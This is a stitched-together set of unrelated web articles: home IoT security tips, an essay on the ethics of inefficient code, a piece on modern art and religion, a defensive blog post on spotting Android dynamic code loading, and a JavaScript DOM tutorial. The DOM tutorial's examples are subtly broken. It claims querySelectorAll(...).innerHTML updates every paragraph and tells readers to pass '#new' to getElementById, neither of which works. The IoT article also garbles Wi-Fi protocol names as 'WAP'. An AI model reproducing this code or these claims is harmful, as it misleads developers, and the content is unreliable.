<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                    
                    <p>As technology becomes more and&nbsp; more prevalent inside our homes; everything from speakers, to TVs, to washing&nbsp; machines, fridges, light bulbs, doorbells, thermostats, and even fish tanks&nbsp; are being connected to the internet. This comes with some risk. Hackers can now break&nbsp; into your home without ever setting food in it. In this article, I'm going to give you some tips&nbsp; on how to protect yourself and your family.</p>
<blockquote>
<p>This article is&nbsp; the third in a series of how to protect yourself from hackers. The first two cover <a href="https://techplanet.today/post/how-to-protect-your-online-accounts">protecting your&nbsp; online accounts</a> and your <a href="https://techplanet.today/post/how-to-protect-your-devices-from-hackers">devices from hackers</a>, respectively; so don't forget to check those out&nbsp; as well.</p>
</blockquote>
<p>First up, let me say that I love technology and I&nbsp; have quite a few networked gadgets all around my home. The thing is... I've been working with technology&nbsp; for a long time. I'm used to evaluating products, assessing their security, and designing a safe topology within which they can be deployed. Companies... some companies take a lot of care to&nbsp; ensure they are not compromising the security of their systems when they do this; and will bring in&nbsp; outside expertise to make sure they get it right. You can't expect the same sort of rigor&nbsp; to be applied by the general public.</p>
<p>Who goes to the shop to buy a washing machine, and has a security consultant come and perform an assessment of it's networked services? This sort of&nbsp; thing catches companies out all the time. There's an American casino that got hacked because of&nbsp; an internet-connected fish tank in its lobby.</p>
<p>The buzzword for this growing collection&nbsp; of devices that hook themselves up the internet is called the "internet of things" or&nbsp; IoT for short. If it can catch a casino with a dedicated security team flat-footed, your average&nbsp; consumer at home is definitely at a disadvantage.</p>
<p>It doesn't help that a lot of the time this&nbsp; internet connectivity is included as an afterthought. Washing machines aren't getting&nbsp; designed around their network connectivity. They're designed primarily around their ability&nbsp; to wash clothes, and then other factors like energy efficiency and noise. So you've got a decent&nbsp; design for your washing machine and then you find out your competitor's has an app.</p>
<p>Marketing&nbsp; say you need an app too. Right... what's the cheapest thing we can buy to stick in there and make&nbsp; it internet-connected so we can have an app too? As you may have guessed, the cheapest&nbsp; thing is not usually the most secure thing . There are a lot of devices on the market&nbsp; with really cheap and nasty connectivity. That leaves you exposed.</p>
<p>There are some horrible&nbsp; stories floating around of people being watched in their own homes, through their own cameras, by&nbsp; strangers on the internet. Of people coming into their child's bedroom to overhear some creep&nbsp; talking to them through the baby monitor. There are stories of people having their thermostats messed&nbsp; with - cranking up or cutting off the heat in the baby's room.</p>
<p>If your internet-connected fridge is&nbsp; set to holiday mode or your thermostat is set to away mode, a burglar could know when it's safe&nbsp; to break in... if they need to break in at all. If you've got a smart lock and it gets compromised,&nbsp; they may as well have a key. If just one of these devices gets compromised, it can be used to attack&nbsp; everything else on your home network.</p>
<p>My goal here isn't to scare you. More to get you to think&nbsp; about the devices you've got on your home network, and what risk they might pose. This isn't a joke,&nbsp; and it's not the case you'll be saved by anonymity. There is literally a <a href="https://www.shodan.io/" target="_blank" rel="nofollow noopener">search engine</a> that anyone can&nbsp; use that scans the internet for insecure devices. You can use it to search for vulnerable&nbsp; devices in people's homes and it will tell you what they are, where they are, and how to&nbsp; access them. It's that easy.&nbsp;So what can we do?</p>
<h2>Reputation &amp; Account Security</h2>
<p>First of all, do a bit of research on the company&nbsp; who made the product. If you Google your internet connected products, do a whole host of horror&nbsp; stories come up? That might be a good sign not to buy it. Now I should point out that just&nbsp; because a few people got hacked doesn't mean there's something wrong with the product itself. A&nbsp; lot of the time the device is fine but the person who got hacked was using a terrible password, and it was there account that got compromised.</p>
<h2>Default Passwords</h2>
<p>It does lead me onto the topic of default passwords, though. When you get a new device;&nbsp; always, always change the default password. Some devices these days come with a random password&nbsp; instead of the same password for every customer. Change it anyway. Some of these are not as random&nbsp; as they seem. In some cases there are only a handful of different passwords, and they just cycle through&nbsp; them. In others, those random looking letters and numbers are actually the device's physical MAC address (not to be confused with an Apple Mac). The problem with using the MAC address is that's&nbsp; how other devices in the network connect to it, so it can't be a secret - it's actively advertised. In the case of a wireless router, it is blasting that MAC address across the airwaves for anyone&nbsp; to see. Change the password!</p>
<p>If you don't change the password, it's like leaving your front door&nbsp; open with a sign saying "please don't rob me". When one of those scanners find your device on the&nbsp; internet, you can guarantee the first thing they're going to do is try and log in with the default&nbsp; password. This isn't just for home users.</p>
<p>In years gone by I used to onboard a lot of new customers&nbsp; for our support team at work. There were always devices on the network that weren't documented, and more often than not I was able to get into them just by trying a few default passwords. Printers are a big culprit in the corporate world.</p>
<h2>Firmware Updates</h2>
<p>The next thing you should do with any network-connected device is check for software or firmware updates. Anything with network connectivity should&nbsp; receive updates. No software is ever perfect, and as flaws are discovered that can be exploited, the&nbsp; vendor should be providing updates to fix them. On your computer or your phone, the updates&nbsp; are probably pushed to you; so you don't have to do much other than agree to them.</p>
<p>For a&nbsp; lot of IoT devices, though, this isn't the case; so you have to remember to check yourself&nbsp; and install any updates, manually. This is a good thing to check before you buy. How does&nbsp; a device get updated? If it's automatic, great! You're good. If it's a manual process then plan&nbsp; to be in the habit of checking and applying them. If there is no way for it to receive updates, don't&nbsp; buy it! That's a sure sign they've shoehorned in the cheapest bit of connectivity they could find,&nbsp; and didn't bother to think about security at all. This is important.</p>
<p>A quick search for camera I own&nbsp; shows 35 different vulnerabilities that have been reported that affect it, specifically. Fortunately, my device has been updated to protect against them; but only because i went to the manufacturer's&nbsp; website, downloaded the new firmware, and installed it on my camera. Otherwise that would&nbsp; be 35 different ways to try and break into my home.</p>
<h2>Features you don't need</h2>
<p>Speaking of my camera, here's another tip. If you don't need internet connectivity, turn it off. The camera I'm talking&nbsp; about is used as a baby monitor. It has an internet-connected feature that lets&nbsp; me check my baby from anywhere in the world. That's... not a feature I'm ever going to use. The&nbsp; way I see it, if I'm in a position of needing to use the internet connectivity, I'm not in a&nbsp; position to be able to comfort my child anyway, so what's the point? If that's enabled,&nbsp; it's open for anyone in the world to try and abuse it. So because I don't use that&nbsp; feature, I've turned its internet connectivity off. I don't need that to use it in my own home.</p>
<p>So take&nbsp; a look at your devices, and the features they offer. Turning off every feature you don't actually&nbsp; use can dramatically reduce the attack surface of your home.&nbsp;</p>
<h2>Wireless Security</h2>
<p>The heart of most home networks is of course&nbsp; your router. Technically speaking, it's probably a combined router, switch, firewall, wireless access&nbsp; point, and modem; but we'll stick with the name "router". Hopefully you've taken my earlier&nbsp; advice, and you've already changed both its administrative password and the password for the&nbsp; wireless network. There's more to it than just the password itself, though. Most routers come with&nbsp; various levels of security that can be enabled.</p>
<p>Unfortunately for most home readers, the default&nbsp; setting is to enable all of them. This is simply because a lot of home users would get confused if&nbsp; asked to choose their own settings, so the router makers just switch everything on to make it as&nbsp; easy as possible for people to get up and running. The downside of course is that by enabling&nbsp; options with weak security, you also make it easier for hackers to get in, too.</p>
<p>The most likely&nbsp; options you'll have for wireless security are WEP, WAP, and WAP2. The latest devices may also support&nbsp; WPA3. There are variations on these including personal and enterprise versions. For most home&nbsp; users you'll be after the personal version that uses a pre-shared key. Enterprise versions are&nbsp; aimed at businesses and are more secure, but require more knowledge and infrastructure to&nbsp; set up.</p>
<p>The general rule to follow is that you want to start with the most secure, work your way&nbsp; down, and only enable the security options that are absolutely necessary to allow your devices to&nbsp; connect.<img src="https://techplanet.today/storage/posts/2020/11/5fa277d2282ac.webp" alt="How To Protect Your Smart Home" width="508" height="auto" data-src="/storage/posts/2020/11/5fa277d2282ac.webp">WAP3 is the latest and greatest so if you have that, turn it on. A lot of devices at this time&nbsp; are not going to support it, so you'll almost certainly want to enable WPA2 as well. For&nbsp; the time being at least. In most cases you won't need to enable vanilla WAP. WPA2 has been around&nbsp; for 16 years, so it's pretty well supported. If in doubt, keep WAP1 turned off and see if everything&nbsp; works. If it doesn't, try reconnecting the …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>In this post I will explore the idea that because running code contributes to global warming, writing inefficient code is morally wrong<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. I will start by outlining the argument, before working through each of the premises in turn to see how they hold up. I will then conclude that even if we cannot concretely defend every premise in this first iteration, then it is sufficiently plausible that it should at least make us pause for thought. With that said, let’s dive in!</p><p>The argument I am considering, in summary, can be presented as:</p><ol><li>Running code produces greenhouse gasses, proportional to the computing resources it requires.</li><li>Greenhouse gasses contribute to global warming.</li><li>Global warming increases the suffering of others.</li><li>Therefore, increasing your consumption of computing resources increases your contribution to the suffering of others.</li><li>Inefficient code increases your consumption of computing resources.</li><li>Therefore, inefficient code increases your contribution to the suffering of others.</li><li>Increasing your contribution to the suffering of others is morally wrong.</li><li>Therefore, writing inefficient code is morally wrong.</li></ol><p>I believe the argument as laid out above is valid, in that the conclusions follow from the premises, so we will focus our energies on determining if it is sound, that is all the premises are true. We will now break it down and look at each premise more carefully.</p><blockquote><ol><li>Running code produces greenhouse gasses, proportional to the computing resources it requires.</li></ol></blockquote><p>The first premise is based on the fact that running code requires electricity. Electricy, in large, requires the burning of fossil fuels, which releases a number of greenhouse gasses. There are cases where this is not the case (solar energy, wind energy), and in such cases, this argument is invalid. However, if you run your code on AWS, then it is very likely that you are running on fossil fuels<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. As AWS is the largest provider of cloud computing, this is likely to be true in a good number of cases.</p><blockquote><ol start="2"><li>Greenhouse gasses contribute to global warming.</li><li>Global warming increases the suffering of others.</li></ol></blockquote><p>With regards to the second and third premises, these are statements which are consistent with the overwhelming scientific consensus, and as such are uncontroversial. For the sake of completeness, here are some supporting statements from the <a href="https://www.ipcc.ch/site/assets/uploads/2018/02/AR5_SYR_FINAL_SPM.pdf">2014 climate change report summary</a> from the Intergovernmental Panel on Climate Change, emphasis mine.</p><blockquote><p><strong>Human influence on the climate system is clear, and recent anthropogenic emissions of greenhouse gases are the highest in history</strong>. Recent climate changes have had widespread impacts on human and natural systems.</p></blockquote><blockquote><p><strong>Warming of the climate system is unequivocal, and since the 1950s, many of the observed changes are unprecedented over decades to millennia</strong>. The atmosphere and ocean have warmed, the amounts of snow and ice have diminished, and sea level has risen.</p></blockquote><blockquote><p><strong>Continued emission of greenhouse gases will cause further warming and long-lasting changes in all components of the climate system, increasing the likelihood of severe, pervasive and irreversible impacts for people and ecosystems</strong>. Limiting climate change would require substantial and sustained reductions in greenhouse gas emissions which, together with adaptation, can limit climate change risks.</p></blockquote><blockquote><p>Cumulative emissions of CO2 largely determine global mean surface warming by the late 21st century and beyond.</p></blockquote><blockquote><p><strong>Climate change will amplify existing risks and create new risks for natural and human systems.</strong> Risks are unevenly distributed and are generally greater for disadvantaged people and communities in countries at all levels of development.</p></blockquote><p>I believe these to be enough to support the argument that greenhouse gasses contribute to global warming, and that global warming will increase suffering of the human and other animal populations.</p><blockquote><ol start="4"><li>Therefore, increasing your consiumption of computing resources increases your contribution to the suffering of others.</li></ol></blockquote><p>So here we come to our first conclusion, that increasing ones consumption of computing resources increases ones contribution to the suffering of others. It is based on at least two implicit premises. The first is that if A contributes to B, and B causes C, A contributes to C. The second is that in such a transitive relationship, if you increase your contribution to A then you increase your contribution to C. To illustrate, we can imagine a much more straightforward case. Imagine that I have a dial which, when turned, increases the voltage supplied to an electric chair. There are several such dials, and their contributions are additive. It would be fair to say that if I turned up my dial, I am contributing to the suffering of whoever is in that electric chair.</p><p>Given this assertion, it would seem reasonable that if running code produces greenhouse gasses, and greenhouse gasses contribute to global warming, then running code contributes to global warming. Global warming increases the suffering of others, so it follows that running code increases ones contribution to the suffering of others.</p><blockquote><ol start="5"><li>Inefficient code increases your consumption of computing resources.</li></ol></blockquote><p>Premise five seems relatively uncontroversial, though to simplify let us just consider the length of time some piece of code takes to run (in a similar way we assess algorithmic complexity). If an efficient version runs in 1 minute, and an inefficient version runs in 1 hour, it stands to reason that the inefficient version would consume more electricity.</p><blockquote><ol start="6"><li>Therefore, inefficient code increases your contribution to the suffering of others</li></ol></blockquote><p>With point six we again come to a relatively straightforward conclusion. If you agree with the earlier conclusion at point four and the premise at point five, then this falls out as a result of the logic of the statements.</p><blockquote><ol start="7"><li>Increasing your contribution to the suffering of others is morally wrong.</li></ol></blockquote><p>Point seven is the real crux of the argument, and on the surface intuitively plausible. In the above example with the dial, it would generally be considered morally wrong for you to dial up the dial and increase the suffering of the individual in the chair. However, if we are merely counting <em>contributions</em> to suffering, this casts a wide net. Would it be morally wrong not to buy an energy efficient bulb when an energy efficient one is available at the same price? How about breathing? This expels carbon dioxide, a greenhouse gas, but would generally not be considered a morally reprehensible action.</p><p>It seems that there is some inherent provision that increasing your contribution to the suffering of others is not morally wrong if it causes equal or greater personal suffering. For example, if there was some shared well of water, it would be reasonable to claim that it is not morally wrong of you to take a sip of water in order to save yourself from dehydration, even if that means other may become more dehydrated. However, if you drained the well, and threw that water away, causing another to die to dehydration, that seems morally wrong.</p><p>I think for the purposes of this post, we can consider this sufficiently true (there is definitely some sense in which it is true), even if is vulnerable to <a href="https://en.wikipedia.org/wiki/Reductio_ad_absurdum">reductio ad absurdum</a> in it’s current form. Consider it the alpha version of the premise - solid enough to be useful, but not without it’s bugs.</p><blockquote><ol start="8"><li>Therefore, writing inefficient code is morally wrong.</li></ol></blockquote><p>Here we come to the conclusion of the argument, that writing inefficient code is morally wrong, which follows from the logic set out in the conclusion at point six and the premise at point seven. So what does this mean?</p><p>As discussed, I am aware that this argument is probably not watertight, and perhaps with some more time spent on it we could tighten it up<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>. I think the premise at point seven could definitely be better defended, and there almost certainly some implicit premises and caveats that need to be put in place. However, I think it is reasonable enough that it should make us pause and reflect. Whilst a lot of code performance issues can be covered up with bigger and better hardware, these come at a greater cost than just an increased AWS bill. The decisions we make as developers have real world effects.</p><p>If there are ways that we can reduce ‘programming waste’ we should strive to do so, whether that is changing an algorithm to be <code>O(1)</code>, scaling down some cloud instances or killing of that Heroku dyno that’s not really doing anything useful<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>. Collectively we can make a real difference.</p><section role="doc-endnotes"><hr><ol><li id="fn:1" role="doc-endnote"><p>I have had this idea knocking around for a while, but reading <a href="https://visitmy.website/2020/07/13/this-website-is-killing-the-planet/">this post</a> motivated me to explore it further.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2><span data-preserver-spaces="true">Modern Art and Religion</span></h2><p><span data-preserver-spaces="true">Modern art draws a clear boundary between religion and art. Religious contemporary literature is named a pseudo art or non-art in most circles.</span></p><p><span data-preserver-spaces="true">With the emergence of the neo-classical movement in Europe, a debate began about separating art and religion. With time, this led to the complete separation of religion and arts in the Modern and Post-Modern era.&nbsp;</span></p><p><span data-preserver-spaces="true">Works of fiction moved away from all religious connotations. Modern art gradually donned a new skin - one dissociated from religion. New standards deemed it taboo to borrow metaphors, and anecdotes, from religious texts.</span></p><p><span data-preserver-spaces="true">The separation of Art and Religion in our minds is like the separation of the church and the State. Politics, however, is very different. Where art is an organic living thing, politics is a mechanistic process. Art finds worth in emotions, beliefs, ideas, and cultures - it feels, laughs, cries, and believes; whereas politics looks after power, benefit, and in rare cases, the commonwealth.</span></p><h2><span data-preserver-spaces="true">How Religion Shapes Art</span></h2><p><span data-preserver-spaces="true">Literature and art were born in religious texts. <em>Rig Vedas</em>, <em>Quran</em>, and <em>the Bible</em> inspired Milton's <em>Paradise Lost</em>, Dante's <em>Divine Comedy</em>, Rumi's <em>Mathnavi</em>, the poetry of Hafiz, and so many other poets. Shelly's poetry uses metaphors from the <em>Greek Pantheon</em> and mythology, composing devout prayers appreciating nature's beauty.</span></p><p><span data-preserver-spaces="true">Religion influenced even heretical works like Nietzsche's <em>Thus Spoke Zarathustra</em>. Zarathustra comes down from a mountain to proclaim God's death and an end to religion, but his language is archaic and Biblical. His very character is prophetic and religious - a sort of poetic contradiction.</span></p><p><span data-preserver-spaces="true">In modern classical literature like <em>the Chronicles of Narnia</em> and <em>the Lord of the Rings</em>, religious symbolism shapes many characters. Biblical Prophets like Moses have encouraged fantastical characters like the wizard.</span></p><p><span data-preserver-spaces="true">Religion affects us subconsciously, without us realizing it. It is no mere chance that religious symbols are present everywhere — in our songs, media, architecture, and even mannerisms. Our environments, cultures, and history shape our affinities, making us love Bach's <em>Art of Fugue</em>, Schubert's <em>Ave Maria</em>, and many other musical pieces, whether we are religious or not.&nbsp;</span></p><h2><span data-preserver-spaces="true">Great Art and Religion</span></h2><p><span data-preserver-spaces="true">However, religion alone cannot create great art. All great works of art, religious or irreligious, speak the true voice of the artist's heart — without propaganda. Be it atheism, religion, irreligion, or any other dogma, art should be built seamlessly like an organic thing — living and breathing a life of its own, adding beauty and a sense of completion to it.</span></p><p><span data-preserver-spaces="true">We see this profundity and beauty in Rumi's <em>Mathnavi</em>. In the beginning, he seems a madman, but the more you read, the more sense it all makes until you start seeing everything with Rumi's eyes. Great art is like that — instantaneously living, never forced, and never artificial.</span></p><h3><strong><span data-preserver-spaces="true">Rumi &amp; Coleman Barks</span></strong></h3><p><span data-preserver-spaces="true">Coleman Barks is an accurate representation of a modern artist. He takes Rumi's brilliance, forcefully tones it down to a mundane level, and presents it to us on a rusty platter. Barks blatantly molds Rumi's words into different meanings murdering their purpose. Majid Nafisi, a Persian scholar, is not wrong in saying:</span></p><blockquote><p>To remodel and fix Rumi for the American market, Barks follows the path of a New-Age Sufi. He tries to disconnect Rumi's mystical concepts from their historical and social backgrounds and modify them for our contemporary taste.</p><p>- <em>Coleman Barks and Rumi's Donkey</em>, Majid Nafisi</p></blockquote><p>The result is a completely different creation - one based on propaganda. Art does not oppose change; rather it <em>is</em> the herald of change and evolution, but when art is turned into Silver - docile, malleable, and controlled; it no longer remains art.</p><h2><span data-preserver-spaces="true">Art as an Organism</span></h2><blockquote><p><em><span data-preserver-spaces="true">A living thing never forgets its roots. You can shed its form, burn its flesh, and erase its memories, but the fundamental constituents: its mannerism, behaviors, and affinities go back to its roots, its history.</span></em></p></blockquote><p><span data-preserver-spaces="true">Art is not a machine in a factory that can be reconfigured and changed with changing trends and ideologies. It is a living, breathing, evolving organism - an unconquerable heart driven by the artist's soul. Coercion, compulsion, lies, and hypocrisy cannot create art - only propaganda.</span></p><p><span data-preserver-spaces="true">Though ideologies shape art when they influence the people, the process is gradual, evolving, and natural. Forced dogmas only kill its spirit leaving behind an empty shell.</span></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<p><strong>TL;DR:</strong> Through dynamic loading, malware authors can covertly load malicious code into their application in order to avoid detection. We can detect such loading through the application’s /proc/[PID]/maps kernel generated file.<br>Recently, we created a simple script that allows us to detect dynamic loading in Android apps. This presented us with a good opportunity to discuss dynamic loading in general in this blog.&nbsp; <br></p>
<h2><strong>Dynamic Loading and Linking:</strong></h2>
<p>In order to understand the rest of the blog, it is important to go over the basics of linking and loading, and highlight the differences between linking vs. loading, and static vs. dynamic.<br></p>
<p><strong>What Is Linking:</strong></p>
<p>The process of compilation has multiple parts. Linking is the last step before we get a runnable <a href="https://en.wikipedia.org/wiki/Executable">executable</a>. A program is usually more than a simple self-contained file, and relies on other libraries or files to operate. As such, it’s not enough for you to compile your code into machine-code to be able to run it, but also to somehow <em>link</em> the different files into a cohesive executable.</p>
<p>How is this done in practice? After compilation and assembly, the assembler outputs object files, which usually correspond to each module in your program. Such files can be either relocatable or executable. Object files of the first variety have to undergo linking before they can be run but ones of the second type can be executed immediately. In the GNU/Linux ecosystem, the usual extension for an object file is .o. Shared object files, known as libraries, are relocatable object files that are intended to be used by many different programs, and can’t be run on their own. In GNU/Linux, they have the extension .so (Shared Object), whereas in Windows they have the .dll (Dynamic-link Library) extension.</p>
<p>The linker then takes the files, resolves the symbols (functions and variables), and points them to the correct memory addresses by writing everything down in the symbol table of the executable. For the sake of performance, it also <em>relocates</em> your code so that related pieces of code end up mapped to nearby memory addresses, regardless of how you originally organized your program, as human readability isn’t an issue anymore, and performance is the main priority.&nbsp;</p>
<figure><a href="https://lh5.googleusercontent.com/XXBewy1ae5qCqrNeXEtizLTtuiz-9wmPcWOwYn8FniarcntKqWuIwzrVE1-gpIK02fC3S_RQMadOoMg-RC2zrlT2fuduhUv_gr_UUAuTjm0dXpD-Ii2jjWYRwEM-kqDEsw6w1ukv"><img src="https://lh5.googleusercontent.com/XXBewy1ae5qCqrNeXEtizLTtuiz-9wmPcWOwYn8FniarcntKqWuIwzrVE1-gpIK02fC3S_RQMadOoMg-RC2zrlT2fuduhUv_gr_UUAuTjm0dXpD-Ii2jjWYRwEM-kqDEsw6w1ukv" alt="linking" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></a></figure>
<p><strong>The Many Different Names of the Executable:</strong></p>
<p>In both Linux and Windows those seemingly different extensions have the same underlying formats as executables. In Windows, they are PEs (Portable Executable), and usually have the extensions .exe and .dll, and in Linux, they are ELFs (Executable and Linkable File), and have the extensions .bin, .so or .o (Yes, the object files we mentioned earlier are also ELFs).</p>
<p><strong>Dynamic Linking:</strong></p>
<p>We say that something has been dynamically linked when instead of doing that process during compile-time, it is done in load-time or runtime. Which brings us to loading: a loader simply copies the contents of the linker’s output to memory, and runs the program. When dynamic linking is used, the linking process occurs just before loading, when running the program, which often leads to confusion between the two.<br> Dynamic loading, on the other hand, means that parts of the code can be loaded to memory at any point during runtime. The two processes can and frequently are done together.</p>
<p><strong>So Why Is This a Problem?</strong></p>
<div><p>Dynamic loading is certainly useful. For example, rather than loading all libraries your program will use at load-time, you could load them up only when you need to use them, thus using less memory, or only conditionally load them in certain cases.</p><p>But it also presents an easy way for malware developers to hide their malicious code. They can put all of their legitimate code in the APK, and move all of the nefarious code into a DEX (Dalvik Executable) that the application will download and then dynamically load during use and thus make their application appear innocuous upon basic static inspection of the APK.</p></div>
<p><strong>Android 10 Mitigation:</strong></p>
<p>Thankfully, our wise overlords at Google decided to prevent such abuse by <a href="https://developer.android.com/about/versions/10/behavior-changes-10">forbidding apps from loading executables</a> (ELFs like .so, .bin and so on) from their home directory – they can now (API level 29+) only load binary code that’s included in their APK.<br></p>
<p>DEX files, however, have not changed and can still be dynamically loaded, so the threat hasn’t been completely eliminated. Furthermore, apps are now forbidden from changing their binary code in-memory after it has been loaded.</p>
<p><strong>How are DEX Classes Loaded:</strong></p>
<p>Android offers an option for dynamically loading .dex files using a class called <a href="https://developer.android.com/reference/dalvik/system/DexClassLoader">DexClassLoader</a>. To load a class, we simply need to write:<br></p>
<pre><code>// Init the loader
DexClassLoader dexClassLoader = new DexClassLoader(path_to_dex, null, null, parent_class);

// Load the class:
Class dynamic_class = dexClassLoader.loadClass("DynamicClass");

// Load a method we could call it
Method method = dynamic_class.getMethod("method1");</code></pre>
<p>And then we can use the method’s invoke() to use the method.<br></p>
<p><strong>The /proc/[PID]/maps File:</strong></p>
<p>In Unix, <a href="https://en.wikipedia.org/wiki/Everything_is_a_file">everything is a file</a>, and even if it isn’t really one, it is handled and accessed like one. This includes the Kernel’s data structures, and Linux is no exception to the rule. The Linux Kernel allows us to access and read its data structures through the /proc/ <strong>pseudo-file system</strong>. Each process then has its own folder at /proc/[PID]. The files and subfolders here hold plenty of useful and important information about the process, but today we will focus on just one file: /proc/[PID]/maps.</p>
<p>/proc/[PID]/maps displays a chart of the mapped memory of a process. When we say mapped memory, we mean a virtual memory segment that has a one to one correspondence with a file. This mapping enables an application to modify and access files by reading and writing directly to memory. This means that when a program accesses a file, this will end up being recorded in its /proc/[PID]/maps file.</p>
<p>/proc/[PID]/maps also shows us what permissions the process has for each segment. This can help us determine which files the process edited and which files it has read.</p>
<p>Here is how a short segment of a normal /proc/PID/maps file looks:</p>

<p><strong>Our Humble Script:</strong></p>
<p>In offending android applications, dynamic loading of code is usually done from the home directory of the application, so files loaded to memory from that dictionary (or other common locations) ought to appear in the maps file. To automate the task of checking that file, we constructed a very simple script that uses regex to search for the string ‘/data/data’ in the maps file of a given PID in the connected device and returns the lines that match. /data/data is of course the apps home directory where files and data are stored. It is the only location from which an app can load DEX files.<br></p>

<p>Interacting with ADB through Python was sometimes a challenge, as doing so using the shell can be awkward, but we found a useful set of tools called <a href="http://docs.pwntools.com/en/latest/">pwntools</a> that provide exactly that functionality. They offer a vast set of functionalities designed to help with hacking and prototyping. Definitely check it out. </p>

<p>Have you ever tried to create a specific functionality when someone clicks on a button on your site? Or do you need some interactions when users interface with forms?</p>
<p>A HTML script is usually static with little functionality. HTML alone cannot maneuver elements to fit certain conditions or for interactivity. To have a web page that is interactive and dynamic, we need the DOM.</p>
<h2>What is DOM</h2>
<p>Document Object Model (DOM) is a programming interface for HTML and XML documents. JavaScript DOM is the API that JavaScript uses to communicate to static HTML elements, making them more functional.<br>The DOM is a tree-like representation of the contents of a webpage using nodes instead of elements. These nodes represent HTML elements, and they can be manipulated and re-rendered. With DOM, nodes act as objects, giving access to programming languages like JavaScript to modify, create, delete, remove, use, and transverse HTML elements.</p>
<p>DOM is a <strong>W3C</strong> (<em>World Wide Web Consortium</em>) standard. W3C specifications support it for HTML/CSS and ECMAScript for JavaScript. It runs on major browsers and supports cross-browser compatibility with some minor differences.</p>
<h2>Accessing the DOM</h2>
<p>The DOM is hierarchical, following a logical tree-like structure, where child nodes are contained in parent nodes. This arrangement is due to the HTML syntax structure where elements are embedded in each other, starting with the <doctype html=""> tag - the overall parent tag of the HTML document, which houses every other HTML tag and elements.<br>All DOM actions start at the top of the document file. This is the first level of access. Then it works its way down to other node points, manipulating them according to instruction.</doctype></p>
<p>This HTML sample,</p>
<pre><code>&lt;DOCTYPE html&gt; 
  &lt;head&gt;
    &lt;title&gt;Html document&lt;/title&gt;
    &lt;meta charset="utf-8"&gt;
  &lt;/head&gt; 
  &lt;body&gt;
    &lt;div&gt;
      &lt;p&gt;This is a paragraph&lt;/p&gt;
      &lt;img src="img1.png" alt="img1"&gt;
      &lt;ul&gt;
        &lt;li&gt;List one&lt;/li&gt;
        &lt;li&gt;List two&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>Can be visualized like this in a DOM structure as follows, </p>
<p><img src="https://cdn.codecoda.com/img/pixel.gif" data-plugin-lazyload="" data-plugin-options="{'effect' : 'fadeIn', 'speed' : 'fast'}" data-original="https://cdn.codecoda.com/themes/user/site/default/asset/img/blog/html-scheme.png" alt="DOM Structure Scheme"></p>
<h2>DOM elements explained</h2>
<p>These are HTML elements restructured as nodes. We can dissect each node object according to its position in the structure and its relationship with other nodes. Note that these positions and relationships change according to the HTML structure written by the developer. </p>
<ol>
<li><strong>The Root Node</strong>: The root node is the &lt;Doctype html&gt; - typical for all html documents. </li>
<li><strong>The Parent Node</strong>: The Parent node is the node with a child or children. This node is a direct predecessor of any node. For example, the body is the parent node of <em>div</em>. Ul is the parent node of <em>li</em>. </li>
<li><strong>Child Node</strong>: The child nodes are nodes or elements that are housed within a parent node. For example, “&lt;li&gt;” is the child node of “&lt;ul&gt;”. </li>
<li><strong>Siblings Node</strong>: These are nodes on the same level. The two <em>li</em> are siblings. Meta and title are also siblings. </li>
<li><strong>Descendant Nodes</strong>: These are node objects inherited from a top level node. All nodes nested in a given node is a descendant of that node. <em>P</em> is a descendant of body. So is <em>ul, img, li</em> and <em>div</em>. </li>
</ol>
<p>When working with DOM, certain actions are needed to target specific node objects. These actions are called Methods, and they have properties assigned to them. Asides from methods, JavaScript also has events attached to node objects. HTML DOM has lots of procedures that perform different operations on elements. Let's look at some DOM document methods.</p>
<h4>QuerySelector()</h4>
<p>The querySelector() method returns only the first child element that matches a specified CSS class, id, name, or tag.</p>
<pre><code>&lt;html&gt; 
  &lt;body&gt; 
    &lt;p&gt;This is paragraph one&lt;/p&gt; 
    &lt;p&gt;This is paragraph two&lt;/p&gt; 
    
    &lt;button onclick="func();"&gt;Click me&lt;/button&gt; 
 
    &lt;script&gt;
      function func(){ 
        let n = document.querySelector("p").innerHTML = "This is query selector"; 
      } 
   &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>When you click the button, the first instance of &lt;p&gt;, which is "This is paragraph one," changes to "This is query selector."</p>
<h4>QuerySelectorAll()</h4>
<p>This changes all instances of the specified CSS selector.</p>
<pre><code>&lt;html&gt; 
  &lt;body&gt; 
    &lt;p class="para"&gt; This is paragraph one &lt;/p&gt; 
    &lt;p class="para"&gt; This is paragraph two &lt;/p&gt; 
    
    &lt;button onclick="func();"&gt;Click me&lt;/button&gt; 
 
    &lt;script&gt; 
      function func(){ 
        let n = document.querySelectorAll(".para").innerHTML = "This is a query selector"; 
      } 
   &lt;/script&gt; 
 &lt;/body&gt;
&lt;/html&gt; </code></pre>
<p>Both paragraphs change to "This is query selector".</p>
<h4>document.getElementByID</h4>
<p>This method is a special one that targets the elements of specified IDs. You must define these IDs within the HTML. Unlike <strong>querySelectors()</strong> that can take the name, tag, ID, or class, <strong>document.getElementById</strong> is specific to IDs only, and it must carry the hashtag (#) sign. </p>
<pre><code>&lt;p&gt;This is not a selected id&lt;/p&gt; 
&lt;p id="new"&gt; This is a selected id &lt;/p&gt;

&lt;button onclick="func();"&gt;Click me&lt;/button&gt; 

&lt;script&gt; 
  function func(){ 
    let n = document.getElementById("#new"); 
    n.style.color = "purple";
  } 
&lt;/script&gt;
</code></pre>
<p>The text of the paragraph with id 'new' changes to purple.</p>
<h4>document.getElementsByClassName</h4>
<p>The elements are targeted with their class names. One than element can be targeted using class names.</p>
<pre><code>&lt;p class="new"&gt; This is a selected id &lt;/p&gt; 

&lt;script&gt; 
  let n = document.getElementsByClassName("#new");
&lt;/script&gt;</code></pre>
<p>The same goes for <strong>getDocumentByTagName</strong>. This targets elements using their element name.</p>
<pre><code>&lt;p&gt; This is a selected id &lt;/p&gt;

